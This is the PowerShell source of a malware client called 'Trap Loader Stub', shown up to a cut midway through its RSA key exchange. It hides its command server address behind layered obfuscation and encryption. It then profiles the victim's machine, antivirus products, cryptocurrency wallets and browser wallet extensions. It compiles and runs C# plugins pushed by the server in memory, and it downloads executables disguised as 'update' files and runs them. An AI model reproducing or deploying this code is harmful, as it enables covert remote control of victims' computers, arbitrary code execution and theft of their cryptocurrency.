# Trap Loader Stub - AES-256-CBC + HMAC-SHA256 + RSA Key Exchange
# Placeholders are replaced at build time by the Builder

$urlPart1 = '{{URL_PART1}}'
$urlPart2 = '{{URL_PART2}}'
$urlPart3 = '{{URL_PART3}}'
$aesKey = [byte[]]@({{AES_KEY}})
$aesIv = [byte[]]@({{AES_IV}})

function Descramble($s) {
    $sb = New-Object Text.StringBuilder
    foreach ($c in $s.ToCharArray()) {
        $v = [int][char]$c
        if ($v -ge 65 -and $v -le 90) { [void]$sb.Append([char](($v - 65 + 13) % 26 + 65)) }
        elseif ($v -ge 97 -and $v -le 122) { [void]$sb.Append([char](($v - 97 + 13) % 26 + 97)) }
        elseif ($v -ge 48 -and $v -le 57) { [void]$sb.Append([char](($v - 48 + 5) % 10 + 48)) }
        elseif ($c -eq '!') { [void]$sb.Append('+') }
        elseif ($c -eq '?') { [void]$sb.Append('/') }
        elseif ($c -eq '*') { [void]$sb.Append('=') }
        else { [void]$sb.Append($c) }
    }
    return $sb.ToString()
}

$full = Descramble ($urlPart1 + $urlPart2 + $urlPart3)
$compressed = [Convert]::FromBase64String($full)
$msIn = New-Object IO.MemoryStream(@(,$compressed))
$gzip = New-Object IO.Compression.GzipStream($msIn, [IO.Compression.CompressionMode]::Decompress)
$msOut = New-Object IO.MemoryStream
$gzip.CopyTo($msOut); $gzip.Close()
$ciphertext = $msOut.ToArray(); $msOut.Close(); $msIn.Close()

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $aesKey; $aes.IV = $aesIv
$decryptor = $aes.CreateDecryptor()
$ms = New-Object IO.MemoryStream(@(,$ciphertext))
$cs = New-Object Security.Cryptography.CryptoStream($ms, $decryptor, [Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object IO.StreamReader($cs)
$serverUrl = $sr.ReadToEnd()
$cs.Close(); $ms.Close()

$httpPassword = "{{PASSWORD}}"
$encryptionKey = "{{ENCRYPTION_KEY}}"

# ==================== AES-256-CBC + HMAC-SHA256 ====================

$script:globalAesKey = $null

function Derive-HmacKey {
    param([byte[]]$AesKey)
    $hex = ($AesKey | ForEach-Object { $_.ToString("x2") }) -join ""
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hmacStr = [Text.Encoding]::UTF8.GetBytes("HMAC-" + $hex)
    $hash = $sha.ComputeHash($hmacStr)
    $sha.Dispose()
    return $hash
}

function Write-EncryptedMessage {
    param(
        [System.IO.Stream]$Stream,
        [byte]$MsgType,
        [byte[]]$Payload,
        [byte[]]$AesKey
    )

    $payloadLen = if ($Payload) { $Payload.Length } else { 0 }
    $plaintextLen = 1 + $payloadLen
    $plaintext = New-Object byte[] $plaintextLen
    $plaintext[0] = $MsgType
    if ($payloadLen -gt 0) {
        [Array]::Copy($Payload, 0, $plaintext, 1, $payloadLen)
    }

    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $iv = New-Object byte[] 16
    $rng.GetBytes($iv)
    $rng.Dispose()

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $AesKey
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $enc = $aes.CreateEncryptor()
    $ciphertext = $enc.TransformFinalBlock($plaintext, 0, $plaintextLen)
    $enc.Dispose()
    $aes.Dispose()

    $ivCipher = New-Object byte[] (16 + $ciphertext.Length)
    [Array]::Copy($iv, 0, $ivCipher, 0, 16)
    [Array]::Copy($ciphertext, 0, $ivCipher, 16, $ciphertext.Length)

    $hmacKey = Derive-HmacKey -AesKey $AesKey
    $h = [System.Security.Cryptography.HMACSHA256]::new($hmacKey)
    $hmac = $h.ComputeHash($ivCipher)
    $h.Dispose()

    $totalLen = $ivCipher.Length + 32
    $packet = New-Object byte[] (4 + $totalLen)
    $packet[0] = [byte]($totalLen -band 0xFF)
    $packet[1] = [byte](($totalLen -shr 8) -band 0xFF)
    $packet[2] = [byte](($totalLen -shr 16) -band 0xFF)
    $packet[3] = [byte](($totalLen -shr 24) -band 0xFF)
    [Array]::Copy($ivCipher, 0, $packet, 4, $ivCipher.Length)
    [Array]::Copy($hmac, 0, $packet, 4 + $ivCipher.Length, 32)

    $Stream.Write($packet, 0, $packet.Length)
    $Stream.Flush()
}

function Read-TcpExact {
    param(
        [System.IO.Stream]$Stream,
        [int]$Count
    )

    $buffer = New-Object byte[] $Count
    $totalRead = 0

    while ($totalRead -lt $Count) {
        $read = $Stream.Read($buffer, $totalRead, $Count - $totalRead)
        if ($read -le 0) { return $null }
        $totalRead += $read
    }

    return $buffer
}

function Read-EncryptedMessage {
    param(
        [System.IO.Stream]$Stream,
        [byte[]]$AesKey
    )

    $lenBuf = Read-TcpExact -Stream $Stream -Count 4
    if ($null -eq $lenBuf) { return $null }

    $totalLen = [int]$lenBuf[0] -bor
                ([int]$lenBuf[1] -shl 8) -bor
                ([int]$lenBuf[2] -shl 16) -bor
                ([int]$lenBuf[3] -shl 24)

    if ($totalLen -le 32 -or $totalLen -gt 5242880) {
        return $null
    }

    $data = Read-TcpExact -Stream $Stream -Count $totalLen
    if ($null -eq $data) { return $null }

    $ivCipherLen = $totalLen - 32
    $ivCipher = New-Object byte[] $ivCipherLen
    $receivedHmac = New-Object byte[] 32
    [Array]::Copy($data, 0, $ivCipher, 0, $ivCipherLen)
    [Array]::Copy($data, $ivCipherLen, $receivedHmac, 0, 32)

    $hmacKey = Derive-HmacKey -AesKey $AesKey
    $h = [System.Security.Cryptography.HMACSHA256]::new($hmacKey)
    $computedHmac = $h.ComputeHash($ivCipher)
    $h.Dispose()

    if ($computedHmac.Length -ne $receivedHmac.Length) { return $null }
    for ($i = 0; $i -lt $computedHmac.Length; $i++) {
        if ($computedHmac[$i] -ne $receivedHmac[$i]) { return $null }
    }

    if ($ivCipherLen -lt 16) { return $null }

    $iv = New-Object byte[] 16
    $ciphertext = New-Object byte[] ($ivCipherLen - 16)
    [Array]::Copy($ivCipher, 0, $iv, 0, 16)
    [Array]::Copy($ivCipher, 16, $ciphertext, 0, $ciphertext.Length)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $AesKey
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    $plaintext = $dec.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    $dec.Dispose()
    $aes.Dispose()

    if ($plaintext.Length -lt 1) { return $null }

    $msgType = $plaintext[0]
    $payload = $null
    if ($plaintext.Length -gt 1) {
        $payload = New-Object byte[] ($plaintext.Length - 1)
        [Array]::Copy($plaintext, 1, $payload, 0, $payload.Length)
    }

    return @{ Type = $msgType; Payload = $payload }
}

# ==================== SYSTEM INFO ====================

function Get-MachineFingerprint {
    try {
        $cpuId = Get-CimInstance -ClassName Win32_Processor -ErrorAction Stop |
            Select-Object -First 1 -ExpandProperty ProcessorId
        $biosId = Get-CimInstance -ClassName Win32_BIOS -ErrorAction Stop |
            Select-Object -ExpandProperty SerialNumber
        $mainboardId = Get-CimInstance -ClassName Win32_BaseBoard -ErrorAction Stop |
            Select-Object -ExpandProperty SerialNumber

        $fingerprint = "$cpuId-$biosId-$mainboardId"
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $hashBytes = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($fingerprint))
        $sha.Dispose()
        return [BitConverter]::ToString($hashBytes).Replace("-", "")
    }
    catch {
        return [Guid]::NewGuid().ToString().Replace("-", "").ToUpper()
    }
}

function Get-WindowsVersion {
    try {
        $os = [System.Environment]::OSVersion.Version
        switch ($os.Major) {
            10 {
                if ($os.Build -ge 22000) { return "Windows 11" }
                return "Windows 10"
            }
            6 {
                switch ($os.Minor) {
                    3 { return "Windows 8.1" }
                    2 { return "Windows 8" }
                    1 { return "Windows 7" }
                    0 { return "Windows Vista" }
                }
            }
            default { return "Windows $($os.Major).$($os.Minor)" }
        }
    }
    catch { return "Unknown" }
}

function Get-SpecificAntivirus {
    $avProducts = @()
    $avPaths = @{
        "Norton"           = "SOFTWARE\Norton"
        "McAfee"           = "SOFTWARE\McAfee"
        "Kaspersky"        = "SOFTWARE\Kaspersky Lab"
        "Bitdefender"      = "SOFTWARE\Bitdefender"
        "Avast"            = "SOFTWARE\AVAST Software"
        "AVG"              = "SOFTWARE\AVG Technologies"
        "Windows Defender" = "SOFTWARE\Microsoft\Windows Defender"
        "ESET"             = "SOFTWARE\ESET"
        "Malwarebytes"     = "SOFTWARE\Malwarebytes"
        "Trend Micro"      = "SOFTWARE\TrendMicro"
        "Sophos"           = "SOFTWARE\Sophos"
        "Webroot"          = "SOFTWARE\WRData"
    }
    foreach ($av in $avPaths.GetEnumerator()) {
        try {
            if (Get-Item -Path "HKLM:\$($av.Value)" -ErrorAction SilentlyContinue) {
                $avProducts += $av.Key
            }
        } catch { }
    }
    if ($avProducts.Count -eq 0) { return "None" }
    return ($avProducts | Select-Object -Unique) -join ", "
}

function Get-WalletNames {
    $walletNames = @()

    $walletPaths = @{
        "Armory"       = "$env:APPDATA\Armory"
        "Atomic"       = "$env:APPDATA\Atomic\Local Storage\leveldb"
        "Bitcoin"      = "$env:APPDATA\Bitcoin\wallets"
        "Bytecoin"     = "$env:APPDATA\bytecoin"
        "Coinomi"      = "$env:LOCALAPPDATA\Coinomi\Coinomi\wallets"
        "Dash"         = "$env:APPDATA\DashCore\wallets"
        "Electrum"     = "$env:APPDATA\Electrum\wallets"
        "Ethereum"     = "$env:APPDATA\Ethereum\keystore"
        "Exodus"       = "$env:APPDATA\Exodus\exodus.wallet"
        "Guarda"       = "$env:APPDATA\Guarda\Local Storage\leveldb"
        "Jaxx"         = "$env:APPDATA\com.liberty.jaxx\IndexedDB"
        "Litecoin"     = "$env:APPDATA\Litecoin\wallets"
        "Monero GUI"   = "$env:USERPROFILE\Documents\Monero\wallets"
        "WalletWasabi" = "$env:APPDATA\WalletWasabi\Client\Wallets"
        "Ledger Live"  = "$env:APPDATA\Ledger Live"
        "Trezor Suite" = "$env:APPDATA\@trezor\suite-desktop"
    }

    foreach ($wallet in $walletPaths.GetEnumerator()) {
        try {
            if (Test-Path $wallet.Value) {
                $walletNames += $wallet.Key
            }
        } catch { }
    }

    $browserPaths = @{
        "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Opera"    = "$env:APPDATA\Opera Software\Opera Stable"
        "OperaGX"  = "$env:APPDATA\Opera Software\Opera GX Stable"
        "Vivaldi"  = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Chromium" = "$env:LOCALAPPDATA\Chromium\User Data"
    }

    $walletDirs = @{
        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
        "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
        "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain"
        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
        "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
        "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
        "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
        "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda Wallet"
        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
        "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
        "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
        "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
        "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep"
        "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
        "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"
    }

    foreach ($browser in $browserPaths.GetEnumerator()) {
        try {
            if (Test-Path $browser.Value) {
                foreach ($wd in $walletDirs.GetEnumerator()) {
                    $extPath = Join-Path $browser.Value "Default\Local Extension Settings\$($wd.Key)"
                    $extPath2 = Join-Path $browser.Value "Local Extension Settings\$($wd.Key)"
                    if ((Test-Path $extPath) -or (Test-Path $extPath2)) {
                        $walletNames += "$($wd.Value)"
                    }
                }
            }
        } catch { }
    }

    if ($walletNames.Count -eq 0) { return "None" }
    return ($walletNames | Select-Object -Unique) -join ", "
}

function Get-IsAdmin {
    try {
        $p = [System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()
        if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { return "Yes" }
        return "No"
    } catch { return "Unknown" }
}

function Get-HasWebcam {
    try {
        $cameras = Get-CimInstance -ClassName Win32_PnPEntity -ErrorAction Stop |
            Where-Object { $_.PNPClass -eq "Image" -or $_.PNPClass -eq "Camera" -or $_.Name -like "*camera*" -or $_.Name -like "*webcam*" } |
            Select-Object -First 1
        if ($cameras) { return "Yes" }
        return "No"
    } catch { return "Unknown" }
}

function Get-SystemInfo {
    $osVer = Get-WindowsVersion
    $machine = $env:COMPUTERNAME
    if ([string]::IsNullOrWhiteSpace($machine)) {
        $machine = [System.Environment]::MachineName
    }
    if ([string]::IsNullOrWhiteSpace($machine)) {
        $machine = "Unknown"
    }
    $av = Get-SpecificAntivirus
    $wallets = Get-WalletNames
    $isAdmin = Get-IsAdmin
    $hasWebcam = Get-HasWebcam
    return "$osVer|$machine|$av|$wallets|$isAdmin|$hasWebcam"
}

# ==================== MESSAGE TYPES ====================

$MSG_AUTH          = [byte]0x01
$MSG_HEARTBEAT     = [byte]0x02
$MSG_CLIENT_INFO   = [byte]0x03
$MSG_ACTIVE_WINDOW = [byte]0x04
$MSG_PLUGIN_DATA   = [byte]0x10
$MSG_PLUGIN_BATCH  = [byte]0x11

$MSG_AUTH_OK       = [byte]0x81
$MSG_AUTH_FAIL     = [byte]0x82
$MSG_HEARTBEAT_ACK = [byte]0x83
$MSG_PLUGIN_CMD    = [byte]0x90
$MSG_FILE_TRANSFER = [byte]0x91
$MSG_DISCONNECT    = [byte]0xFF

# ==================== ACTIVE WINDOW (user32 P/Invoke) ====================

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public static class ActiveWindowHelper
{
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    public static string GetActiveWindowTitle()
    {
        try
        {
            IntPtr hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return "";
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(hwnd, sb, 256);
            return sb.ToString();
        }
        catch { return ""; }
    }
}
"@ -ReferencedAssemblies @('System.dll') -ErrorAction Stop

function Get-ActiveWindowTitle {
    return [ActiveWindowHelper]::GetActiveWindowTitle()
}

# ==================== PLUGIN ENGINE ====================

Add-Type -TypeDefinition @"
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

public class PluginRunner
{
    public ConcurrentQueue<byte[]> InQueue  = new ConcurrentQueue<byte[]>();
    public ConcurrentQueue<byte[]> OutQueue = new ConcurrentQueue<byte[]>();
    public CancellationTokenSource Cts      = new CancellationTokenSource();
    public Thread WorkerThread;
    public Exception LastError;
    public volatile bool Running;

    public void Start(object pluginInstance)
    {
        Running = true;
        WorkerThread = new Thread(() =>
        {
            try
            {
                Func<byte[], Task> sendFunc = (data) =>
                {
                    OutQueue.Enqueue(data);
                    return Task.CompletedTask;
                };

                Func<Task<byte[]>> receiveFunc = () =>
                {
                    while (!Cts.IsCancellationRequested)
                    {
                        byte[] item;
                        if (InQueue.TryDequeue(out item))
                            return Task.FromResult(item);
                        Thread.Sleep(5);
                    }
                    return Task.FromResult<byte[]>(null);
                };

                var runMethod = pluginInstance.GetType().GetMethod("Run");
                if (runMethod == null)
                {
                    LastError = new Exception("Plugin has no Run method");
                    return;
                }

                var task = (Task)runMethod.Invoke(pluginInstance, new object[] { sendFunc, receiveFunc });
                task.GetAwaiter().GetResult();
            }
            catch (Exception ex) { LastError = ex; }
            finally { Running = false; }
        });
        WorkerThread.IsBackground = true;
        WorkerThread.Name = "PluginWorker";
        WorkerThread.Start();
    }

    public void Stop()
    {
        try { Cts.Cancel(); } catch { }
        try { if (WorkerThread != null && WorkerThread.IsAlive) WorkerThread.Join(3000); } catch { }
        Running = false;
    }

    public int GetOutQueueCount() { return OutQueue.Count; }

    public void ClearOutQueue()
    {
        byte[] discard;
        while (OutQueue.TryDequeue(out discard)) { }
    }
}
"@ -ReferencedAssemblies @('System.dll') -ErrorAction Stop

$global:ActivePlugins = @{}

function Resolve-AssemblyPath {
    param([string]$name)
    $fwDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
    $path = Join-Path $fwDir $name
    if (Test-Path $path) { return $path }
    try {
        $base = $name -replace '\.dll$'
        $asm = [System.Reflection.Assembly]::LoadWithPartialName($base)
        if ($asm) { return $asm.Location }
    } catch {}
    return $null
}

# ==================== PLUGIN FUNCTIONS ====================

function Invoke-PluginCommand {
    param([string]$PluginId, [int]$CmdType, [byte[]]$Data)

    switch ($CmdType) {
        0 {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Loading: $PluginId" -ForegroundColor Magenta
            if ($global:ActivePlugins.ContainsKey($PluginId)) { Stop-Plugin -PluginId $PluginId }
            try {
                $code = [Text.Encoding]::UTF8.GetString($Data)

                $cp = New-Object Microsoft.CSharp.CSharpCodeProvider
                $params = New-Object System.CodeDom.Compiler.CompilerParameters
                $params.GenerateInMemory = $true
                $params.TreatWarningsAsErrors = $false
                $params.WarningLevel = 4
                $refNames = @(
                    'System.dll',
                    'System.Core.dll',
                    'System.Drawing.dll',
                    'System.Windows.Forms.dll',
                    'System.Management.dll',
                    'System.Xml.dll',
                    'System.Xml.Linq.dll',
                    'System.IO.Compression.dll',
                    'System.IO.Compression.FileSystem.dll',
                    'System.Runtime.Serialization.dll',
                    'System.Speech.dll',
                    'System.ServiceModel.dll',
                    'System.ServiceProcess.dll',
                    'System.Transactions.dll',
                    'System.Web.dll',
                    'System.Web.Extensions.dll',
                    'System.DirectoryServices.dll',
                    'System.Messaging.dll'
                )
                foreach ($r in $refNames) {
                    $path = Resolve-AssemblyPath $r
                    if ($path) { $null = $params.ReferencedAssemblies.Add($path) }
                }
                $result = $cp.CompileAssemblyFromSource($params, $code)
                if ($result.Errors.HasErrors) { throw ($result.Errors | Select-Object -First 1).ErrorText }
                $pluginInstance = $result.CompiledAssembly.CreateInstance("ClientPlugin_$($PluginId).Main")
                if ($null -eq $pluginInstance) { throw "Plugin type not found" }
                $runner = New-Object PluginRunner
                $runner.Start($pluginInstance)
                $global:ActivePlugins[$PluginId] = @{ Runner = $runner }
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Started: $PluginId" -ForegroundColor Green
            } catch {
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Load error: $($_.Exception.Message)" -ForegroundColor Red
                $global:ActivePlugins.Remove($PluginId)
            }
        }
        1 {
            if ($global:ActivePlugins.ContainsKey($PluginId)) {
                $global:ActivePlugins[$PluginId].Runner.InQueue.Enqueue($Data)
            }
        }
        2 {
            if ($global:ActivePlugins.ContainsKey($PluginId)) { Stop-Plugin -PluginId $PluginId }
        }
    }
}

function Stop-Plugin {
    param([string]$PluginId)
    if ($global:ActivePlugins.ContainsKey($PluginId)) {
        try { $global:ActivePlugins[$PluginId].Runner.Stop() } catch { }
        $global:ActivePlugins.Remove($PluginId)
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Stopped: $PluginId" -ForegroundColor Yellow
    }
}

function Stop-AllPlugins {
    foreach ($plugId in @($global:ActivePlugins.Keys)) { Stop-Plugin -PluginId $plugId }
}

function Cleanup-DeadPlugins {
    foreach ($plugId in @($global:ActivePlugins.Keys)) {
        $pe = $global:ActivePlugins[$plugId]
        if ($pe -and $pe.Runner) {
            if ($pe.Runner.LastError) {
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] $plugId died: $($pe.Runner.LastError.Message)" -ForegroundColor Red
                $pe.Runner.Stop()
                $global:ActivePlugins.Remove($plugId)
            }
            elseif (-not $pe.Runner.Running -and $pe.Runner.WorkerThread -and -not $pe.Runner.WorkerThread.IsAlive) {
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] $plugId exited" -ForegroundColor Yellow
                $global:ActivePlugins.Remove($plugId)
            }
        }
    }
}

function Get-HasPluginOutput {
    foreach ($plugId in @($global:ActivePlugins.Keys)) {
        $pe = $global:ActivePlugins[$plugId]
        if ($pe -and $pe.Runner -and $pe.Runner.GetOutQueueCount() -gt 0) {
            return $true
        }
    }
    return $false
}

function Send-AllPluginOutput {
    param([System.IO.Stream]$Stream, [byte[]]$AesKey)

    $anySent = $false

    foreach ($plugId in @($global:ActivePlugins.Keys)) {
        $pluginEntry = $global:ActivePlugins[$plugId]
        if ($null -eq $pluginEntry -or $null -eq $pluginEntry.Runner) { continue }

        $queueCount = $pluginEntry.Runner.GetOutQueueCount()
        if ($queueCount -le 0) { continue }

        if ($queueCount -gt 100) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] $plugId backlog ($queueCount), clearing" -ForegroundColor Yellow
            $pluginEntry.Runner.ClearOutQueue()
            continue
        }

        $idBytes = [Text.Encoding]::UTF8.GetBytes($plugId)

        $sent = 0
        while ($sent -lt 50) {
            $item = $null
            $dequeued = $pluginEntry.Runner.OutQueue.TryDequeue([ref]$item)
            if (-not $dequeued -or $null -eq $item) { break }

            $payload = New-Object byte[] (1 + $idBytes.Length + $item.Length)
            $payload[0] = [byte]$idBytes.Length
            [Array]::Copy($idBytes, 0, $payload, 1, $idBytes.Length)
            [Array]::Copy($item, 0, $payload, 1 + $idBytes.Length, $item.Length)

            Write-EncryptedMessage -Stream $Stream -MsgType $MSG_PLUGIN_DATA -Payload $payload -AesKey $AesKey
            $sent++
            $anySent = $true
        }
    }

    return $anySent
}

# ==================== MESSAGE HANDLERS ====================

function Handle-PluginCmd {
    param([byte[]]$Payload)
    if ($null -eq $Payload -or $Payload.Length -lt 2) { return }
    $idLen = [int]$Payload[0]
    if ($idLen -le 0 -or ($idLen + 1) -gt $Payload.Length) { return }
    $pluginId = [Text.Encoding]::UTF8.GetString($Payload, 1, $idLen)
    $dataOffset = 1 + $idLen
    $dataLen = $Payload.Length - $dataOffset
    $data = $null
    if ($dataLen -gt 0) {
        $data = New-Object byte[] $dataLen
        [Array]::Copy($Payload, $dataOffset, $data, 0, $dataLen)
    }
    if ($null -ne $data -and $data.Length -ge 1) {
        $cmdType = [int]$data[0]
        $cmdData = $null
        if ($data.Length -gt 1) {
            $cmdData = New-Object byte[] ($data.Length - 1)
            [Array]::Copy($data, 1, $cmdData, 0, $cmdData.Length)
        }
        Invoke-PluginCommand -PluginId $pluginId -CmdType $cmdType -Data $cmdData
    }
}

function Handle-FileTransfer {
    param([byte[]]$Payload, [byte[]]$AesKey)
    if ($null -eq $Payload -or $Payload.Length -lt 3) {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - File transfer payload too small" -ForegroundColor Red
        return
    }

    $execMode = $Payload[0]
    $hashLen = [int]$Payload[1]
    $offset = 2

    if (($offset + $hashLen) -gt $Payload.Length) {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Invalid file transfer metadata" -ForegroundColor Red
        return
    }

    $expectedHash = ""
    if ($hashLen -gt 0) {
        $expectedHash = [Text.Encoding]::UTF8.GetString($Payload, $offset, $hashLen)
        $offset += $hashLen
    }

    $fileLen = $Payload.Length - $offset
    if ($fileLen -le 0) {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Empty file payload" -ForegroundColor Red
        return
    }

    $fileBytes = New-Object byte[] $fileLen
    [Array]::Copy($Payload, $offset, $fileBytes, 0, $fileLen)

    $modeName = if ($execMode -eq 0x01) { "IN-MEMORY" } else { "DROP-TO-DISK" }
    Write-Host "$(Get-Date -Format 'HH:mm:ss') - File received: $($fileBytes.Length) bytes ($modeName)" -ForegroundColor Green

    if ($expectedHash) {
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $actualHash = [BitConverter]::ToString($sha.ComputeHash($fileBytes)).Replace("-", "").ToLower()
        $sha.Dispose()
        if ($actualHash -ne $expectedHash) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - HASH MISMATCH! Rejecting." -ForegroundColor Red
            return
        }
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Hash verified OK" -ForegroundColor Green
    }

    $suffix = [Guid]::NewGuid().ToString().Substring(0, 8)
    if ($fileBytes.Length -gt 1 -and $fileBytes[0] -eq 0x4D -and $fileBytes[1] -eq 0x5A) {
        $fileName = "update-$suffix.exe"
    } elseif ($fileBytes.Length -gt 1 -and $fileBytes[0] -eq 0x50 -and $fileBytes[1] -eq 0x4B) {
        $fileName = "update-$suffix.zip"
    } else {
        $fileName = "update-$suffix.bat"
    }

    $filePath = [IO.Path]::Combine([IO.Path]::GetTempPath(), $fileName)
    try {
        [IO.File]::WriteAllBytes($filePath, $fileBytes)
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Saved: $filePath" -ForegroundColor Green
        Start-Process -FilePath $filePath -ErrorAction Stop
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Executed successfully" -ForegroundColor Green
    } catch {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Execute error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ==================== PARSE SERVER ADDRESS ====================

function Parse-ServerAddress {
    param([string]$Address)
    $result = @{ Host = ""; Port = 443 }
    $addr = $Address.Trim() -replace '^https?://', '' -replace '/.*$', ''
    if ($addr -match '^(.+):(\d+)$') {
        $result.Host = $Matches[1]
        $result.Port = [int]$Matches[2]
    } else {
        $result.Host = $addr
    }
    return $result
}

# ==================== MAIN ====================

$machineId = Get-MachineFingerprint
$systemInfo = Get-SystemInfo

$parsed = Parse-ServerAddress -Address $serverUrl
$sHost = $parsed.Host
$sPort = $parsed.Port

if ([string]::IsNullOrWhiteSpace($sHost)) {
    Write-Host "Invalid server address: $serverUrl" -ForegroundColor Red
    Start-Sleep -Seconds 10
    exit 1
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host " Trap Loader Client (AES-CBC)" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host " Server  : $sHost`:$sPort" -ForegroundColor Gray
Write-Host " Machine : $machineId" -ForegroundColor Gray
Write-Host " Crypto  : AES-256-CBC + HMAC-SHA256" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$heartbeatInterval = 5

# ==================== CONNECTION LOOP ====================

try {
while ($true) {
    $tcpClient = $null
    $stream = $null

    try {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connecting to $sHost`:$sPort..." -ForegroundColor Yellow

        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.NoDelay = $true
        $tcpClient.ReceiveBufferSize = 1048576
        $tcpClient.SendBufferSize = 1048576
        $tcpClient.ReceiveTimeout = 60000
        $tcpClient.SendTimeout = 30000

        $asyncResult = $tcpClient.BeginConnect($sHost, $sPort, $null, $null)
        $connected = $asyncResult.AsyncWaitHandle.WaitOne(5000, $false)

        if (-not $connected) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connection timeout. Retrying..." -ForegroundColor Yellow
            try { $tcpClient.Close() } catch { }
            Start-Sleep -Seconds 5
            continue
        }

        try { $tcpClient.EndConnect($asyncResult) }
        catch {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connection refused. Retrying..." -ForegroundColor Yellow
            try { $tcpClient.Close() } catch { }
            Start-Sleep -Seconds 5
            continue
        }

        $stream = $tcpClient.GetStream()
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - TCP connected! Performing key exchange..." -ForegroundColor Green

        # ========== RSA KEY EXCHANGE ==========
        # Read server RSA public key (4-byte LE length + CSP blob)
        $keyLenBuf = Read-TcpExact -Stream $stream -Count 4
        if ($null -eq $keyLenBuf) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Failed to read key length" -ForegroundColor Red
            throw "Key exchange failed"
        }
        $serverKeyLen = [int]$keyLenBuf[0] -bor ([int]$keyLenBuf[1] -shl 8) -bor ([int]$keyLenBuf[2] -shl 16) -bor ([int]$keyLenBuf[3] -shl 24)
        if ($serverKeyLen -le 0 -or $serverKeyLen -gt 1024) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Invalid key length: $serverKeyLen" -ForegroundColor Red
            throw "Key exchange failed"
        }

        $serverRsaPubKey = Read-TcpExact -Stream $stream -Count $serverKeyLen
